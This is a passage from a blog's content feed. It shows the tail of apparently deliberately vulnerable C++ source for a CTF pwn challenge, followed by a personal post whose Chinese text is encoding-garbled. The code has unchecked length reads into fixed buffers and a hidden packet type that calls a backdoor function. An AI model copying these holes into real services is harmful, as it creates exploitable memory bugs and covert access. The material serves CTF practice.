punctuation">;</span>  <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    byte<span class="token operator">*</span> buf  <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">magiccmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span>RECV_MAGIC<span class="token punctuation">)</span><span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> length <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> packet_type <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> key_len<span class="token punctuation">,</span> id_len<span class="token punctuation">,</span> expr_len<span class="token punctuation">,</span> res_len<span class="token punctuation">,</span> status<span class="token punctuation">,</span> i<span class="token punctuation">;</span>      <span class="token keyword">char</span><span class="token operator">*</span> key <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">37</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">memset</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      string skey<span class="token punctuation">;</span>      string s_corr_id<span class="token punctuation">;</span>      string s_res<span class="token punctuation">;</span>      <span class="token keyword">char</span><span class="token operator">*</span> corr_id<span class="token punctuation">;</span>      <span class="token keyword">char</span><span class="token operator">*</span> packet<span class="token punctuation">;</span>      <span class="token keyword">char</span><span class="token operator">*</span> expr<span class="token punctuation">;</span>      <span class="token keyword">char</span><span class="token operator">*</span> res<span class="token punctuation">;</span>      Q q<span class="token punctuation">;</span>      Data d<span class="token punctuation">;</span>      <span class="token keyword">switch</span><span class="token punctuation">(</span>packet_type<span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token number">0</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// connect</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>starting <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            starting <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> done_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">else</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// declare</span>          uuid_t uuid<span class="token punctuation">;</span>          <span class="token function">uuid_generate</span><span class="token punctuation">(</span>uuid<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">uuid_unparse</span><span class="token punctuation">(</span>uuid<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>          skey <span class="token operator">=</span> key<span class="token punctuation">;</span>          mq<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>pair<span class="token operator">&lt;</span>string<span class="token punctuation">,</span>Q<span class="token operator">></span><span class="token punctuation">(</span>skey<span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          packet <span class="token operator">=</span> <span class="token function">construct_result</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> packet<span class="token punctuation">,</span> <span class="token number">36</span><span class="token operator">+</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// retrieve</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          key_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>key<span class="token punctuation">,</span> key_len<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          id_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    corr_id <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>id_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">memset</span><span class="token punctuation">(</span>corr_id<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>id_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>corr_id<span class="token punctuation">,</span> id_len<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>key_len<span class="token operator">+</span>id_len<span class="token operator">!=</span>length<span class="token number">-12</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          skey <span class="token operator">=</span> key<span class="token punctuation">;</span>          s_corr_id <span class="token operator">=</span> corr_id<span class="token punctuation">;</span>          it_find <span class="token operator">=</span> mq<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>skey<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>it_find<span class="token operator">!=</span>mq<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            i <span class="token operator">=</span> mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">||</span> mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>corr_id <span class="token operator">!=</span> s_corr_id<span class="token punctuation">)</span>            <span class="token punctuation">{</span>              <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> retry_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>              <span class="token comment" spellcheck="true">// Âá∫Èòü</span>              res_len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>res<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              packet <span class="token operator">=</span> <span class="token function">construct_result</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>res<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> packet<span class="token punctuation">,</span> res_len<span class="token operator">+</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">break</span><span class="token punctuation">;</span>                         <span class="token punctuation">}</span>          <span class="token punctuation">}</span>          <span class="token keyword">else</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// call</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          key_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>key<span class="token punctuation">,</span> key_len<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          id_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    corr_id <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>id_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">memset</span><span class="token punctuation">(</span>corr_id<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>id_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>corr_id<span class="token punctuation">,</span> id_len<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          expr_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    expr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>expr_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">memset</span><span class="token punctuation">(</span>expr<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>expr_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>expr<span class="token punctuation">,</span> expr_len<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>key_len<span class="token operator">+</span>id_len<span class="token operator">+</span>expr_len<span class="token operator">!=</span>length<span class="token number">-12</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token comment" spellcheck="true">// ÊâßË°åËøêÁÆó</span>          res <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">memset</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          status <span class="token operator">=</span> <span class="token function">calc</span><span class="token punctuation">(</span>expr<span class="token punctuation">,</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>status <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          skey <span class="token operator">=</span> key<span class="token punctuation">;</span>          s_corr_id <span class="token operator">=</span> corr_id<span class="token punctuation">;</span>          s_res <span class="token operator">=</span> res<span class="token punctuation">;</span>          it_find <span class="token operator">=</span> mq<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>skey<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>it_find<span class="token operator">!=</span>mq<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// ÂÖ•Èòü</span>            d<span class="token punctuation">.</span>corr_id <span class="token operator">=</span> s_corr_id<span class="token punctuation">;</span>            d<span class="token punctuation">.</span>res <span class="token operator">=</span> s_res<span class="token punctuation">;</span>            mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> done_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">else</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">4</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// close </span>          <span class="token keyword">return</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">// break;</span>        <span class="token keyword">case</span> <span class="token number">6</span><span class="token punctuation">:</span>          <span class="token function">backdoor</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>                  <span class="token keyword">default</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// error</span>          <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  MQ mq<span class="token punctuation">;</span>  <span class="token function">handle</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span> mq<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><blockquote><p>‰ªäÂ§©Â∞±Ê∞¥Âà∞ËøôÂÑøÂêßüò≠„ÄÇ„ÄÇ</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> ÁéØÂ¢ÉÈÉ®ÁΩ≤ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Some_words_of_today</title>
      <link href="/2018/10/29/Some-words-of-today/"/>
      <url>/2018/10/29/Some-words-of-today/</url>
      
        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="Some-words-of-today"><a href="#Some-words-of-today" class="headerlink" title="Some_words_of_today"></a>Some_words_of_today</h1><blockquote><p>‰ªäÊó•‰ªΩÈó≤ÊâØ„ÄÇüôÉ</p></blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; Áé∞Âú®Êó∂Èó¥Â∑≤Áªè23:06‰∫ÜÔºå‰ªäÂ§©ÁªôÂá†‰ΩçÂ≠¶ÂºüÁÆÄÂçïËÆ≤‰∫Ü‰∏Ä‰∫õÂ∞èÁü•ËØÜÔºàËôΩÁÑ∂Ëá™Â∑±ÂæàlowÔºå‰ΩÜÂ∏åÊúõÂ≠¶ÂºüÂèØ‰ª•ÂæàÂº∫ÔºâÔºåÂÜôÂÆåËøôÁØáÊ∞¥ÊñáÂ∞±Áù°Âêß„ÄÇ‰∏çÁü•ÈÅì‰ªÄ‰πàÊó∂ÂÄôÂºÄÂßãÂ∞±Â∑≤Áªè‰π†ÊÉØ‰∫ÜËøô‰πàÊôöÁù°ÔºåËôΩÁÑ∂Áü•ÈÅìÊôöÁù°Âï•ÁöÑÔºåÁÜ¨Â§ú‰ªÄ‰πàÁöÑÂØπË∫´‰Ωì‰∏çÂ•ΩbalabalaÔºå‰ΩÜÊòØÁîüÊ¥ªÊâÄËø´ÔºåË¢´ÁîüÊ¥ªÂÆâÊéíÁöÑÊòéÊòéÁôΩÁôΩÔºåËôΩÁÑ∂ÁõÆÂâçÂõΩÂÜÖËÆ°ÁÆóÊú∫Ë°å‰∏öÁé∞Áä∂Â¶Ç‰∏ãÂõæÔºö</p><p><img src="https://i.loli.net/2018/10/29/5bd722c007501.png" alt=""></p><p>ÊäëÊàñÊòØÂ¶Ç‰∏ãÂõæÔºö</p><p><img src="https://i.loli.net/2018/10/29/5bd72383adca2.png" alt=""></p><p>&nbsp; &nbsp; &nbsp; &nbsp; ÂàöÂÖ•Â≠¶ÈÇ£‰ºöÂÑøÔºåÂ§ßÂ≠¶ÂòõÔºåÊÜßÊÜ¨ÁöÑÊòØÂï•ÔºüÊó†ÈùûÂ∞±ÊòØÂêÉÂñùÁé©‰πêÔºå‰∫§ÊúãÂèãÔºàÊâæÂ•≥Á•®ÔºüÔºâ‰ª•ÂèäÂ∞ëÈÉ®ÂàÜÂ≠¶‰π†„ÄÇÂØπÂïäÔºåÂ∞±ÊòØËøôÊ†∑Ê≤°ÈîôÂïäÔºåÂ§ßÂÆ∂ÈÉΩÊòØËøô‰πàËÆ§‰∏∫ÁöÑÂòõÔºå‰∏ÄÁõ¥Âà∞Â§ß‰∏ÄËøáÂéª‰∏ÄÂ§ßÂçäÔºåÊàë‰πüÊòØÂ≠¶Â≠¶ÂÅúÂÅúÔºåÁé©Áé©Ê∏∏ÊàèÔºå<del>‰ª•Âèä‰∏ÄÂú∫Ëµ∑‰∫éÈ´ò‰∏≠ÔºåÊ≠¢‰∫éÂ§ß‰∏ÄÊú´ÔºåÁªèÂéÜËøá‰∏ÄËµ∑Ôºå‰πüÁªèÂéÜËøáÂàÜÁ¶ªÔºåËøòÁªèÂéÜËøáÂºÇÂú∞ÔºåÂÉèÁîµËßÜÂâß‰∏ÄÊ†∑ÁöÑÊÅãÁà±</del>,Âë∏Âë∏Âë∏ „ÄÇ</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ÂæàÊôÆÈÅçÁöÑ‰∏Ä‰∏™Áé∞Ë±°ÊòØÔºöÂæàÂ§öÂàöË∏èÂÖ•Â§ßÂ≠¶Ê†°Èó®ÁöÑ‰∫∫ÔºåÂ∞±ÊÉ≥ÂºÄÂßãÊù•‰∏ÄÂú∫ËΩ∞ËΩ∞ÁÉàÁÉàÁöÑÊÅãÁà±ÔºåÊù•ÈáäÊîæËá™Â∑±ÁöÑÂ§©ÊÄßÔºåÊã•Êä±ÂøÉ‰∏≠ÁöÑÁæéÂ•ΩüòÑÔºåÂà∞ÂêéÊù•Âç¥ÂæÄÂæÄÊòØÊúÄÂàùÂºÄÂßãÁöÑ‰∫∫Ëµ∞‰∏çÂà∞‰∏ÄÂùóÂÑø„ÄÇ</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 